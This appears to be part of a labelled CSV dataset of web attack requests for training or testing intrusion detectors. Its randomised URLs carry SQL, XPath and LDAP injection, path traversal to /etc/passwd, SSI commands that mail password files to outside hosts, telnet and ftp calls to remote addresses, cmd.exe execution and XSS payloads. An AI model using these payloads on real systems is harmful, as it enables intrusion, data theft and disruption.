,id,class,vector
63,63,XPathInjection,/BGd/aEerrrgeSeslt/lcA-xvqcat0qksAE/RwxqvnS/DA5CFV-4/g0s1rgtleje/iicohthnh2nott4rd/4_yW/enndhtsaYsaeenevjdi/iv6r4umeaaijbNlr/rj84igtmrnnbEmc6/trtuEohmse0inGleeir.cfm?79=ttdncwipu%40t1%5Bi%25&5oehae=weeeeD&cuyshlalesTh=gtuz&1ttv=15182105&rduelttrsl=vrsxstzwbfflsgap2d&srnIedtr9i=zentpgohEa3ai4m1t&b9iecelasr=734+++++or+++++ouht%2Frdn%2Fg7a%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D3%5D++++or++5700%3D&mT=rQG1.KK4&idis=3hthnia4ar&a5tRinebn=65626923&7dbgsoundIstyleFihomeD2ef=access_logmot&fo9td=5
64,64,SqlInjection,.pAAqa1-OJ=fsuAsMqt4s&aehrtg2T=527&reESu=ctrtboet&jOctc=tESYs-91&katH5tTiserpsow=autoexecoaon&aare==sstriomEq&sels9hgkn=lexpThe7&oioi=aee/hes&eaiacy6wibl=262603589&zsbXfCFlunion5s='UNIONALLSELECTfieldFROMiealderiroWHERE''='
65,65,LdapInjection,/dThAbtnt8olxoe/raT7/sJKFDT9c6_/.b/nBz/sdt4aeidomlah9ny/gVQIJMq/8Hgqu0Re/n@m.e8uQ7/eI.htm?tC2q1@uwWunion=nDRJHSKog6EA&uest=%29++++%28+++%7C++%28nura%3DsNo*%29
66,66,XPathInjection,/hMBY-7CLvTLZBM/1d4Myiesbloa/irgaieoeqsgSrfTei/qsrBSKWw/a7kQxibkprtkq/DOuu/rtI2cD..js?t8oeaco4=wmte46UsEll&SQlO=smsl%27+++++or+++++6+%3C++count%28path%2Fchild%3A%3A*%29++or++%27rl%27+++%3D++++%27&iwwsalA=htelnetnsock_streamAnn+we&rViPecho7Vg=6877696690&fwn3arx=ly
67,67,PathTransversal,/t4JnjIjxP5R-Up-yYHQ/2WDDLQm/4fvI/wS./nRGg0-x.Dm9Myd/nrU7jcaAOp/w95.Kvn/LQAnXYpxp_HeaGIK/q4x7P95U/t4heyanhmdayywieGIe/rctme.exe?atyssdt54r=hLxWD5vjL&nuDatSfnwrhl=02508120&jlmebre=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&2coeet=copyaccess_log
68,68,LdapInjection,/yt@uOehLmM6ye@DpmACs/thr1sAgfs2f5oed/-eCgFxtermoL8v/tE/r4mmL2ixk_pTBEJIl.tiff?arsstgeb7tee=+r&eaehlol=idk&hZOgpkGATFmD=82%29%28%26%28objectClass%3Dfcre%29%28%7C%28sn%3D++++Bhia%29%28cn%3D4o++++J*%29%29&RBYqdo_lU0=im9&rNiy9oenteis3=+%25%29tueepOOi
69,69,PathTransversal,/nMXMlQvCZWTr/nmmCS8rWxoIkl.asp?Nnbyouiu0Du=%40xrondreesystemrprocessing-instruction%5C+%26&wdeleteftpm_kev=anobjectgeTid%2F&tH56=69mTfcp&tidamshitvd=4p%3Ft&ta1q2ha=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fversion&MyTpo=hhzsnorxI
70,70,XPathInjection,/-1U_hQDbgsound-8/yevt7Sw/aGy7eJ/@f3a0Q/aITvrnwuTmcnmtpi4gt/BQXovKRN.K/riuOzCOBV8euG.bin?iq6tesstciNa=qlsuehgnu&ehaonmtteeheba=0033822
71,71,LdapInjection,/w7qswmnsrkk9/i0tUdSWGyMs2./f3utzatuieh/4TIuQOgLJqxh8Cr.nsf?th2=open-dd&dsfb=45&nnR=9&UOa4nLM0unionT@2=atma%29%28%26%28objectClass%3D+7e*%29&E9ti3dpcD=715&Kxg9jOdropHL=+i&snhd5d=160087&tjlrihS=unQ1pN%40vqw&qeep=taelnIpaiframei2eMe5&nhsddpXiHtIeno=lzortrozhFsmThn4
72,72,SSI,"supng3hsaig=674312&rdibedneoa=4&aeTiofgctmioof=<!--    #exec    cmd=""/bin/mail    rrrStba.com     <     /etc/passwd""-->"
73,73,SqlInjection,/gCareeee/shMPyGWyNY0/a6_qXBA7B8aE/hIOv@NSVoKI72Rha/neush3hMad3gayui/MGF/3aGFqKj3O4AwVg3/fTtdwlUynar/OEQHcfkcatpd/eYjIHON@Ke/nPk2CFkuav9/eI6U4vZZx.jsp?otoneornets=3&nmlc=11231&ru0=itQI&dropGHUb=oioniegBtabei6&mpbd=syto9fknO&enako2tfm=83&AmlRenMante=73319&Ieaemftrd=4489481&ge7NyDsBuStcr=nng%5Dnrlikenz%29em&eo=e-UTMGWPx&HnpIqjF=%27select+++++customer_phone+++%27%7C%7C%27from++++customers++%27%7C%7C%27where+++++customer_surname%3D%27%27%27%7C%7C+++++lv_surname%7C%7C%27%27%27++++and+customer_type%3D1%27%3B&petwudlan=vtRddsERonajnil&1xOPEfromJqYu=tx8CR9wQOIdO
74,74,OsCommanding,/cgi-local/alibaba.pl|dir
75,75,XPathInjection,/zARJJ1Pyqpopen9F1/eosSf/oLKeazmfD/udoI2hiodrhoyqm/ppassthruak7qTl8having/TpRd33redo2s/RVtxs76te/h7ei/z-XUa4Tsq/ioa.cgi?erbecpiDLe=nes&2nhonisAetars=9078&t0ec=48117050&em=gyIhaB5X&v9s=a%27&dw6Uaeldweve=oR1e&ih4oSatLnhrv=teVoScgtbhza4taSy&ikdrRsats=epsP%24%5Boperlvarmsl8&tedAyoo=8t%27+or+++++%28i++++%3C+count%280r%2Fchild%3A%3Atext%28%29%29++and+++++j+++++%3C++count%28Md%2Fchild%3A%3Acomment%28%29%29+++and++k++++%3C+++++count%28gA%2Fchild%3A%3A*%29++%29+++or++%27idah%27++++%3D%27++8cttxg%27+or&pnem79ulapg=41&ieWoir=875&qRFpassthru.P-pbgsoundY9=-s-%27wp&9irwrtybh8otc=195136&from.GTCmI=4ip&ta9rehomex=-+
76,76,OsCommanding,/scripts/georgi.asp/..��..��..��file.ext?
77,77,PathTransversal,/esI7DbACXLzwqDI/eHvii/m7dphsehebrtf/RneeersSene/hclh9/t9g4tHxFb30/sRallM1soNdV5eP5A@Lk/iU/fQGhM/11kEfa19VWk.nsf?nOrRukuBLY=cj9fy&460FqyFk=ouzrmled++cci&btfnRaewoo=aoEtid&1@uallr04iframer=cyaptAgooebr&itmeyiu=a5aTYm4BWt_&xr=frliltenqeQ&tod1iuohnlreefl=3812&e0ltme=twinnt&tfeh=u2M&70netcath81xperl4UO=ehonon&tna7ctEMH8so=hh&pthet=403&wgets.bm67yMF=file%3A%2F%2F%2Fu%3A%2Fto%2Fomt%2Fsb0lhocx.xml&1a=43position&a9Mau=vtrxa
78,78,XPathInjection,/edvumcj5mcr59Urwn/g63shNJxq6-SP/iuRl0aseoiraiwtceouh/mK.gif?sr=huhaIw%27+++or++++sh7%2Fnaout%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D785%5D++or+++++%27yeiam1%27%3D+%27&lkhhilbaEboo=1&onUatonc=%3CTcfuwp-eobwEe%29tdw&eqcbsastsus=3531403&toetevetooed=01&nFvn=soi+6p&3lP.=69753
79,79,PathTransversal,/OwtimsuDtkcDgfgs/e0Li60OkFRVy3zHj/9mEKFb4BxzTJ3VL-64.mspx?sirhtgsa=babgeoo48ae&dssCieia0=fsoeya&6In=..%2F..%2F..%2Fusr%2Fdsqqdsqsd.xml&eaklswt9bi1A=843&SFhwld2YF8=o%5C%5Bv+iee&s1EyiTv9Rw2sDus=6&ic=Iortde%26rtsse&ttVnenipermay=3376&jgHWoAkCu9mc=+%3Beg3&btgeNlk=9111&gacsgaw4inaRsa=TethLifysuaoiMsT&insertFnF@UbOCOn=peooEednka%26ntsga6&vlArereNdfFgv=ngfSjsdeaswheor&i7koreoiwslfv=+&lfqlcDaoahvr1Tw=626
80,80,OsCommanding,/bg85z4sS2/sd3v87/aJDIYRSP6e/sTCAE/it4s8nop3lE/tun1RDGAz7x/eEeeoOnoOaEhcifN/s6UeesotvwiO/sqclC7lEtYth17/netcat0Xln.jsp?6ht=4&eo0w=c+D&0epca4ce4d=06&X3.1=s2H_KdB&oliLu=7214&lbr=R%2F&no3ai8igsrehme=%5C%22%5C%3B+%5C%2Fusr%5C%2Fbin%5C%2Ftelnet+www.trlltingoris.com++6750%5C%3B&krh=%3FnuIghcati+%3Co2ie1or&H6iosGm=window.open0
81,81,SqlInjection,_homej.B9accept4X=ie$ heey etc&a9apLeNhae97ts=iheoTlsaformwindow.openAqo&tbRthermld6=158446359&yidSoth8ndj=5~to&suz9=oNee6TieulupCy6&hh8i43thao3=b&wmirnm2oeie33E=cgFdFbj@&ui1rwt=0759913395&hr6rleaeuhsa=uspeohrws4d5eurd&notONrtilesN3rw=9065049&dkdyqnfGeor=X&LUdgttfd6gc7=uetcstrep&a9nqentybr1ujr=8uc&one9sbwiaee=njWiQ0s
82,82,PathTransversal,/n7s5rrvnnh1enacrnee4/s6qnVWKVKL_L/3oteeTsarat/2bnE8Ec4.png?lhttqEUuehr=.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F&e8ibee=760317&62c=ddtn&ikrtau=a6rwewC&dquNSg2LEl3a=98&46eeQeei35nR=t%5C9uiheunion%40hvshutdown%5Dadhf&@2bXa.nEFUFM=79&hwhytgfseem9nk=to%5C&e0s=id%29na
83,83,XPathInjection,/kcCH_sgYSxdwMEl/ChaniXonnsr/az_/eFq240c@Yi0Zsx/gz2@CF.CmLTrO/RaLxttntpee1fsede/ba/nCk/hFrS9qgG/aTcVtbodyperlTxg/emGM_AgHc.bin?rorefcsoer=%5Bot&vregfapgocelixl=sg8R6&hp4=oku%27coag&i2Ieeeg=rcpnEe%7Elog4ed&jform_Puynevt6=853737667&ei=u6ULBDXBi&uc2jce4eneua=1zenecho%7Em&hUenege=5q&LdM0dB0q4QkVw=78993351&tedslSl=y4caccess_logC%24Qdnj&sksanre1sel=Mscript3tiisii+aslo%27%5Dbc%5B%7E&nrr8aaiylttgt=644687&9mgrseNlNai=eiee&7osSvgsydsnan=8Nh%27++++or+gooU1b%2Fea3loN%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D696%5D++++or+%27t3vwyoe%27++%3D++%27&pk3shomejQ3document=tre4
84,84,PathTransversal,/.nsf/../winnt/system.ini?
85,85,PathTransversal,/xwp0tVPLzF5z7juI/psNzOlrZ@g/jv2q6xUXvVILCtRhA.sh?at=tboot.inir5&ii=06&ihoel=vXhroS&naieefm=iTtNioglraY&jvXxml_o=31185&Msr=%2Fetc%2Fpasswd
86,86,OsCommanding,/bin/bho.pl/seite=;cat
87,87,SSI,"9lrEede=paraEi&9fr4i=<!--#email fromhost=""www.egn5eI0e.com"" tohost=""mailbox.xEnFt.com"" message=""ercc3e 2kleew 8wa kmb1aR"" fromaddress=""tcta.com"" toaddress=""htsc.wtco.com"" subject=""f"" sender=""kNao.com"" replyto=""uS5aga.com"" cc=""5y"" inreplyto=""berr Nbr biael"" id=""Or6tmail"" -->&ntcnirottene=nctohd7deenidqol&y28s8raO8tf=45938&saiwlsl7modxdww=7721&coaeaeco2sbeoI=092888046&ZCLvarM=eOUevy0&icieanl9e=A &ekmeehArS=0786&kz3drdydEAHfbz=7976873384"
88,88,PathTransversal,/.nsf/../winnt/system.ini?
89,89,PathTransversal,/./?
90,90,XPathInjection,/sZN_tgKN@v/vU5466iSMRjfmu5b2h4/e6iiqomSvqp4Z/pnhpe4aqeiarsSzBec/Qk6Y3Df0xt0yYN/rytIdXlckgj9RbUi/zagIhakUa/SEt/eugxdrgWae/zsEWLPupdatew/f9xR.KVX18/aadE5a7.mspx?isth=hctarnMl&mItcrzteSi1t=EWntt2riaoLpo&shte2guwknt=tddsel%27+or+++++1%3C+++hb%2Fn%2Fmofc%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D9%5D++or++++%27dfi%27++++%3D+%27&eeaa=au45-9ech1&nasei=drwhd
91,91,LdapInjection,/b-lZM4f/TDv@SxK.htm?ssenHLAorD=feeea%29%28+++%7C+%28ne%3D*%29
92,92,OsCommanding,/eolb6uxYlirserkgqka/efavta/axLShZXIR3BE/UstdinjT/htoatseomtiutoen/XdbodyXandQhtaccesscript0qSidJ3/3E/ha7fNgzNE@.lOyh1UGS/eAH.vIYZ21OGe/6q3fHxtSAfXhadnPw/hhWIRUoCCV/cmE.jpeg?ssltkhx=oamdcoo1it&tdw2ihs=l+dle&tnYmEmu=ooiiNokxat5&uorlrdwmt=de%27boot.inixp_&tccaIjT=+i%5BaetttSnsaqv%27&mo0r=034&JTbO01sock_streamESIgV=mwp-0stdin4tOhboot.ini&OplocationXSQWNU=slr5o&dwrN0L6=%5Cnuftp+-p+www.made.com+++++%2Fieseic%2Froarerststti%2Fllns%2Fitnens%2Ftining%2Fnt
93,93,SSI,/ebii/tAz/yetd1s5heagC/dmeta/322sXvFIQNmVVur/iteescerrlRnae.jpeg?htnejbsek9seat=avhFCi&8uro=mi2irhth%3Ensmj%2Bd8glep
94,94,LdapInjection,/ee0a5fu/rehtaiQbehTco/ldVSUY86/erwbeysateNm/bdATYyoolau4tthhuVew/ax8j9X.iza/cYZam7nilhF6ae9d/hm@y.P41Kx43O.jpg?dtrNflti=%29+++%28++++%7C+++%288s%3Ddniu*%29&utfhioiskeecnem=8%40i_SA7%40uEj&oegeeepnr0a=er&nsO5te=nesots&bXOvvOM7=btaruItsaypac&9eaYauaotsn=ruehgerelt&eyRarutn=iyeA&ibapsheMi=oEadpeErcyiAr
95,95,PathTransversal,/Z-./ies7ttaswrreil/ghraEieeis1predu.png?as=en&W.BU-elFVIi=%28&VrIkdeleteNntmp=262&iiz-J=1owAJ5dw&ndwcor6slnlaVt=ndDze5SW00S&Gpui=n&deenau=adddhy6&en5RdodKnt=tls30c+&access_logadminUbV8wIMe=It9ils&yLFD=7so8a
96,96,OsCommanding,/oe8tnpeatmHaehmiulo9/lhANqONh6cgPr/skC/nzearlwekeDittwso/s2JBMW/4@bW83/nAlrgE/jEdsTdrenocat7/aN/0L1sbodylibA0aytJexec8/aewi.msf?t65tiEl=%5C%22++++%5C%3B++%5C%2Fusr%5C%2Fbin%5C%2Ftelnet++www.matotoit.com+6387%3B&dAhb=0&openfromvFlibIk=be%5D%3E&VWk0httpsvISscriptO=%24hIhf&rros=emtoeooruweno&hinf3ohya1s=56626334&rmarsnw79ia4=bDp0cn2LPM
97,97,SqlInjection,/aUcmeeonih/gte9dcnhnls/ns4/zN/NPStviB@xp_YO3HC/oooric/eJMNn/C4HYTlocation/3lctn/arCttehuTblwoatari/BSl.php?6eqTEiTsos5uSo=6901&allACGLJxp_=-Iv5+0sAoeq13opo&rse3wadaXhiet4=dlslwifonphoi9&ssissffhtqgrei=fchildsystem%24t+&ojtuuonei=peixcltwhree&i3HHa2childoL=%3Eilm&emdphentdv=l4ZpZYCR2&ia29eeowotg8Iea=19&tYe8irddrniaper=%27+or+id++++in++++%28+++select+++++*++++from++++++user_db++++%29&qH=10&xbP7f=189399&TGLVhomezcq=Gehe%3F%3D
98,98,SSI,/k1S6ZwHobject/nludEdtNs0es/slhte/qformlcR9d7/b8IkggU1/aphncrwdEocorndjei.aspx?Anfhsaateg=041&iThtoa=88&UEsZ0BVjlocationmochaL=5&se=s7&tee4thoefsrot=876&scriptopen9xZIrUGapc=1&kbtheI=icE0oznhogerotet&UiIboot.inietc2=o+xShumouo%40%40%3BC&5_OscriptDMf8sam=4348436548&ZZmJ=6823440&tluhr=ilsyaacotPne2cz&Lc1k3@mg1ZPX=805&tenaEfriEtojg7e=37240258&y0y6f1kpottie=82724&en1nriRn5loiden=%3C%21--%23echo+var%3D%22date_gmt%22--%3E
99,99,SqlInjection,/tQF41EDRwanQ./seG@@PHOL-Byr3CE7/t6/sT.Ial/aiSliytc.nsf?jOAiO=leHxrdecta+&lrsmaiosxpi=fq&uHBbRS6Z43=93&SbLa6zlfmosctes=nCv&ue=dhhat&5hn=eNNQARwyKQ7w&_xV2LLik=%27%3B+++begin++++declare+++%40ret++++varchar%288000%29++set++++%40ret%3D%27%3A%27+select+++%40ret%3D%40ret%2B%27+++%27%2BSl6nnhi%2B%27%2F%27%2Bpassword+++++from+fna+++where+892hin%3E%40ret+++++select+++%40ret+++++as++ret++into++++foo+++++end--
100,100,XSS,eSi4yoessaaac4T=|rct/&aeDioiIe=5533469389&ntbymstm8e=lserviceshat8rs0otetelnetnjny&rCe=617638627&jM3-v=wiMnretaa2O&metaS5a9g=cone&orrtntap=hht udivtpese%o&hL-gGPN0H=winnt1Sho&UitttHy5=931276&dbeyde421Eteduc=itde0lpa8r6xtcNa
101,101,XPathInjection,/ckatvMmes1/5hsorruattHehctno/1VRN/sqdfG6eere/hhs3tyyei/US8lsdivvmailwYxtermIySobject/Sk0eetrihEcc9am2/e0QjrkqnqXVKhQ/nrr_EVUk./og9ES5zCT/QTfIpsepu.-.jpeg?winGtchmi3l05t=%270r&n9nsa9rsE=tmpe&rcp9Ui3gJsU=Gipa&dsntkftBlaa=e+olx%3Eeahen+maep+&h0mepsRhm1f=itinbna&aZ0yX=mdggdhOAo&Osoleeelid9rd1c=sn%7E&sint1owzed=o&egpAccSeesz=29921&DhvesNedw=60441&nnnunpitdE=5122605
102,102,LdapInjection,a5L2Su=mEr)(&(objectClass =    igr*)
103,103,LdapInjection,/wx0VYEDbL0_6oU/wj.jpg?dseslqAateiute=E&tsmane=84174100&ae=%29+%28++++%7C%28cn%3D*o+++%27brien*%29%28mail++%3D*o%27brien*++%29+&rnsp=fxsNl_H-l&disbueirsi8p=2564&ErV_7=s3Qz&g3n2eeuh=dies
104,104,LdapInjection,/tp12PblmLGYSb/tYyUX-/rM0GLoL4/vbscriptAP/l9ec6z.swf?uoeErew2=hipg3h%3Eart5oro&A2between5W=230549&pUFWQshutdownW=t%403vvIeNg-iy&ai7aaLrtreng2=6Ey&5ouuhcpmnensoua=811&s9teeorsy=ih8u_k_&cfz4nko0TDU9=64478465&1nVXRZAiGiEr=s++tlueg&hg3qorlgooi=16806&dmle8uywnwltocs=ae9jt&s1fe=ue%29%28%26%28objectClass+++%3D+++na*%29&2ulmv8up=85112175&eruBrEevte=o%26essg9yto
105,105,SSI,/hfnoa0wastoI0rmru3qG/HKautoexec@tPAPnt49g/eidHtosmrR3l/ratrhCu/mc/e3thA.htm?jlyAO=48324329&rmly=brrml6tiywsrhtuye&s5=htuoin1noao&tNatateh3adl=1e&cE3E9d0=ktrj8aMhHe&bhewe=oFiXGrSS7U&I-c6rfC=2pea6rSvsqnng&sahUi=%3C%21--++%23odbc++++connect%3D%220f%2Cxt%2Cf4a%22++++statement%3D%22select++++*+++from+++9%22--%3E&0TtE6gmaabneie=Ehome%3E&RDlasa0iRi=z3atpdass
106,106,PathTransversal,/pl/Vh4LKxj2lUmxOv/ery1ntqthluLtuh1vtiw/b2zQI/cM/itrsyes8slifsvhniSi/BZYRHeeL/r5zsx3-/eusCoeaetlegAe0nf7/8Cinput62phpkvePnjy.php?IdIiaacwo5wft=%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Fllma%2Fasesanta%2Fnsnsde%2Fvean.cgi&CYY6=tIdlr+hfhen%3F+d%2Bbuxml&oeewiedeh=xs%3Ay6t+at%2Bazn5sk&Siaxavx16es=natG%3Bdu%3F%3Esrunionhn%24varetcpassthru%5D
107,107,OsCommanding,/tgXXXO/3VE5V/pmDJ3qtVidFlL63q.Pua/axfrcm1dun/kgN/36foeeeERtjrth/mD98jH365yAwdfEgwR6O/suee/oZqOLQrK6-n3SX.exe?oywg0nahhAn9c=t+&ni6cnqi=74&oxe24tea=g
108,108,XPathInjection,z2seameet6rzGms=udSJGUf8Nj&sKx3ZUZ=75&ftdc0enec6=a6Ra5f4feson&@body3orx6UN8oVA=yuAXQd_&yoeiC1ur=f&Y93processing-instructionZb5j=7927207&2paFddrZsn=588&nhoc31aaaDx=2:eot&sneh=~OsVa&i5hrdib2oapBs7J=betrierzRtmod6o&eldtwSv5tauulyc=aaem'    or (i  < count(alua/child::text()) and   j    <     count(ee/child::comment())    and     k <    count(mdisg/child::*)   )  or     'iu'=' lsnlu2p'  or&hnawtadbe1o32=682456
109,109,SqlInjection,/fxHbt6cVMblSJJ/aaeinhaioakAan/i0/rTln/oeoceo/sRUrV3fAX1-zFN/rrlcaex2Sfi8nbl/hSTpfFo4Kee4MJHIai/osXIincludej/a3.shtml?whl0jrzsez=494624&MLLsystemqkQx=lKe&Sta9oguneern0a=mu&lewshe0r=xIt8nnnek5hwt4nla&a6Eeoi1elsmt=eh%3B&0@1FdI=3s9myqae4Iirtiemlb&fSod=ewinnteh+o%24fi2untmu-&ud=no3form9acd+baacceptEa&shoofroO=lrperlso&_dTKUX=6193&lyh=9aelw1s
110,110,PathTransversal,/teii/fpkhBincludekSDL/wgPFYcx53v/3ao7dfatnmtdatAuo/eK9/v1yh/asFh25ECkt/lh6hns.jpeg?
111,111,PathTransversal,/tPaBzmxqdJJq/ahEqaA/ngucceb/uHG1@MM0FJ/ChtmpFJzt02/tTIFJIt44jWuMWh9Ay/t2tiohiti4nctalt/tt/j6tpuCqZC/nhnaiweeSlDdbGd/tstem.mdb?hedeNsullhr=0350083&m2rhrtoarofoiA=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fyo.bat
112,112,OsCommanding,..��...��..��..��..��../winnt/system32/cmd.exe?/c+dir
113,113,OsCommanding,/afyzRRlj/risw6ozlUste1iaTnlsj/osncwc/sotc3re/ibattUOOe3artZuEt/t2h24Z/sN7.asmx?ficwaoouaiwEAnp=g%40GIJ_GnJH&NdkruscaRcj1a=%27+++%3Buftp+++-g++++%2Fhome%2Fledela%2Filroal+69.173.216.135++++%2Fve+++++%3B&syis6as7rysee=i1thltieEube&aiuenfisse=crt%3E%5Dbetweenuth+&OtaeazuwimtdS=hads4yufnghen&uieh=41556377&5Ie4@KT=o6FeHGN.
114,114,PathTransversal,sagncoeL6=yrh&4Uh1tdn5jet=65082463&HjM6homeM=r2t+pdsdqe]n=htelnet&e7gtpmtodau=@eI<
115,115,SqlInjection,/87CANt0processing-instruction7MP5C/r47fut/nttcQesit.css?ed=%27%3B+shutdown--&raysmdE=HuahluLbpd6X&kpn4Tnoadro=rrdCQpww.Z&httpsjXQcmdX=dRReCgk7&7L8NGOd8=itin%29aeIesj&leAnliLmaetk=t%3Bv&ezeseNosa=t%7E%5CeooerRt%3B%5De0aE%3Dna&35i0iee=e
116,116,PathTransversal,/4MYcYjSvnKYPL/lGITisV0dM@pl0qu4L/lwWno4Z.Dcmd7htpassVx/e3c.eSYych52bi/2GKMrz.AVP6c7rOMrN/xfBiG7H/1pnhtpassh0.jpeg?wvLPul7eres=gJ_90AmTtv&cwrft=tRilceeOlvdfimh&rnqAin2tihlhtea=eu%3BE&n_jz=l4Imbycit&2Kmailyz7T8O=7&etnoaa=file%3A%2F%2F%2Ft%3A%2Fsma%2Fir%2Ftes.xml&e724=3jeite&prcMcfmwod=cat%29fe&ke0Fncppqee8l=+ngs%7CgEJTcrn8e&dXR7=awnidarpottmRog6s&lIrlohldatisEi=ra4coElonfa20Laibu&fns2cap7aneoni=1959
117,117,SqlInjection,/t7h37eVhlsRP/tLivhTrnpohoGaa/adeo1ov2eAthn/gCs3/floo.js?lalqne=OR++%27i61Ie%27+++++IN+++%28+%27+%27++++%29
118,118,OsCommanding,/7lam2odHew8l9us/iotnzvbd7cqwegie/dfbt7etsrtadphoii/ohosanhqeI/niotaoAdbcdomwhchi.msf?e5dsmjguat7Aac=are0Sx&J_jxterm=%7C+++++dir++..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C++++%2C&em=pLU_l
119,119,XSS,/2nyA9if.tiff?seers6talerrW=%3Ca++href++%3D++++%22javas%26%2399%3Bript%26%2335%3B%5Balert+%28%27tatldb1srg%27%29%3B%5D+++++%22++++%3E
120,120,SqlInjection,/2@l.aZLU3FOzy8Ju/hT7IPT@vlikeqobject/17so/NIYeuinclude/rsoEags/ua/reorSXxgYRL/v4tDnurop3Somnh0s/wtthm810tbhsrCisrne.cgi?78S8wKC4x0=arodyoeWzne&Tr=uymeraejuelcSo&edsaohztt0ells=5stoua&o2DhzrtlRm=oinweolatmncaieh&nEM_=ok%40OJbiM&d0t=%3FaaiytrSihme&9f3qD8u=chditmp&mat=%3B+insert+++++into++OPENROWSET%28++++%27SQLoledb%27%2C%27uid%3Dpi%3Bpwd%3Dmts3n%3BNetwork%3DDBMSSOCN%3BAddress%3D126.85.192.9%2C1433%3B%27%2C%27select++*++++from++++_sysdatabases%27%29%3B+select++*++from+++LinkedOrRemoteSrv1.master.dbo.sysdatabases&heD=raoekia&ckam=mleSYfnt+&mal=pHoost&FAovR.yuO5u=nheou&nph-group
121,121,LdapInjection,/mOmie/e1vAAwuc6vTyDf9-/I4/Bnaentcesoccai2Or/HzYfuj.png?efdnam9eh=%29++++%28%7C+%28displayName%3Dhad*%29%28name++++%3D+++had*++++%29%28mail%3Dhad*++%29&sn=vWFfEcY&_YKDBmVandyP=uetelycNrUoltb&rfur=ecuah2esnS&tmir=is02otneai&tsto=tCkxVy5hOKr9&rt=teh&tcie25nnu=hlddb&1samCKo=7%5Cni&TKwinntLaTDh3Y=%3Ci9
122,122,XPathInjection,/ta8OHT3edyodzmSv/otr0i/hoCtr/71r/nnf@7Q7aV2t2w/jn_0/cmd._h5/ooNmketeiyo/ZnshnhI12wloh8mn.css?tet=3211016&tdslou=0I0s&d5dlmedot=tt19%27+or+++1%3C+++++rsl%2Faz%2FucsY%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D1%5D+or++++%27ae6neak%27++++%3D++%27&e7ii1soh3nkint=srb&1GB1scxpj=gtbH&qaqteIwh=20&YHetcM2.p=kt5rnibk45L+ewinntprocessing-instruction&rt2l=koevalh2tdl&Drg=ocmdeselorlyyr
123,123,OsCommanding,/scnwsesyRs3Yde/ceetDchnhlt/oxexgaaQ3n/copy2JFyJICVstdinPetcj/HusrEOXincludewnullas/s%u9kacceptNc0D/execc_6Zc_Rz0meta/JNAIj@rqXOq..b5/hfdtalvrrehca/ylelHg/rmNreuYmSnGBNK.9.css?egmotd=sat&0MdjJhttpjZmz3R=aeydiihu9C&eerrej5ds1te=netcatsrgtnNw7idi&ibofn=%27ds%3Bi
124,124,XSS,/v@4@Q/t-oxterm/802Soy@y7ap/oMS/dl8qtFczomtue/dlessbhr/h03E/XShIHWftowp-eSir/1JmJf/s9bcC.mdb?dTaaumL=4&Z21-delete3h2=rdelecmytvraef3t&linkH5-OKEyzflogn=%3Cscript++%3Ealert+++%28z8ens.ee4t%29%3C%2Fscript++++%3E&miicliirrcab=84358&Apegoe4nlT=550&kmdn9ulestesxfg=rhL&tB=p
125,125,SqlInjection,/lJQV6Lr-73bXQwp8JY/uQF2RwEf34/KrmLXARIxv6U./niG/c.4p2/HYsnlpfeo04s.php3?uheTiki4lo=nTkeuh7o4&IUDn=85&ivhu5neFitbee=%27++%2F**%2F+OR++++%2F**%2F++%27He%27+++++%3E+++%27S
126,126,OsCommanding,/msadc/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
